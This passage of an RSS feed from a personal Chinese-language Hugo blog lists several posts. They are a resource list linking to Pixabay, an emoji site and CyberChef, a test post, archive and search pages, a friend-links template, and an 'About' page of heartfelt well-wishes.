      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
        </item>
        <item>
        <title>资源聚合</title>
        <link>https://Yerucrem.github.io/p/%E8%B5%84%E6%BA%90%E8%81%9A%E5%90%88/</link>
        <pubDate>Wed, 01 Jan 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E8%B5%84%E6%BA%90%E8%81%9A%E5%90%88/</guid>
        <description>&lt;h2 id=&#34;图片&#34;&gt;图片
&lt;/h2&gt;&lt;p&gt;Pixabay:https://pixabay.com/zh/&lt;/p&gt;
&lt;p&gt;emoji:https://www.emojiall.com/zh-hans&lt;/p&gt;
&lt;p&gt;CyberChef:https://gchq.github.io/CyberChef/&lt;/p&gt;
</description>
        </item>
        <item>
        <title>测试</title>
        <link>https://Yerucrem.github.io/p/%E6%B5%8B%E8%AF%95/</link>
        <pubDate>Tue, 19 Mar 2024 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E6%B5%8B%E8%AF%95/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/01DFA140B78CF068F9CB2ACC01C76E40.jpg" alt="Featured image of post 测试" /&gt;&lt;h1 id=&#34;test&#34;&gt;TEST
&lt;/h1&gt;</description>
        </item>
        <item>
        <title>归档</title>
        <link>https://Yerucrem.github.io/archives/</link>
        <pubDate>Tue, 28 May 2019 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/archives/</guid>
        <description></description>
        </item>
        <item>
        <title>关于</title>
        <link>https://Yerucrem.github.io/%E5%85%B3%E4%BA%8E/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/%E5%85%B3%E4%BA%8E/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/background05.jpg" alt="Featured image of post 关于" /&gt;&lt;p&gt;愿你的生活如四月的风，途经的每个路口都洒满阳光；像夏夜的星光，疲惫时有温柔可栖，迷茫时有方向可寻。三餐烟火暖，四季皆安然，脚步所至总有花开，心之所向终有回响。&lt;/p&gt;
&lt;p&gt;愿健康常伴，眉间无忧；愿努力有果，耕耘有获；愿家人闲坐，灯火可亲；愿老友牵挂，新友相知；愿爱与被爱，都不留遗憾。若遇风雨，愿你有伞；若经长夜，愿梦有暖。&lt;/p&gt;
&lt;p&gt;愿你的善意都被珍视，脆弱时有肩膀可依，勇敢时有不灭的信仰。未来的日子，平安喜乐常随，三餐四季皆有清欢，平凡岁月里藏着生生不息的希望。&lt;/p&gt;
&lt;p&gt;世界或许喧闹，但总有人默默为你祝福，比如写下这段话的我，此刻正真诚祈愿：人间值得，你更值得。✨&lt;/p&gt;
</description>
        </item>
        <item>
        <title>搜索</title>
        <link>https://Yerucrem.github.io/search/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/search/</guid>
        <description></description>
        </item>
        <item>
        <title>友链</title>
        <link>https://Yerucrem.github.io/%E5%8F%8B%E9%93%BE/</link>
        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/%E5%8F%8B%E9%93%BE/</guid>
        <description>&lt;!-- To use this feature, add `links` section to frontmatter.

This page&#39;s frontmatter:

```yaml
links:
  - title: GitHub
    description: GitHub is the world&#39;s largest software development platform.
    website: https://github.com
    image: https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png
  - title: TypeScript
    description: TypeScript is a typed superset of JavaScript that compiles to plain JavaScript.
    website: https://www.typescriptlang.org
    image: ts-logo-128.jpg
```

`image` field accepts both local and external images. --&gt;</description>
        </item>
        
    </channel>
</rss>
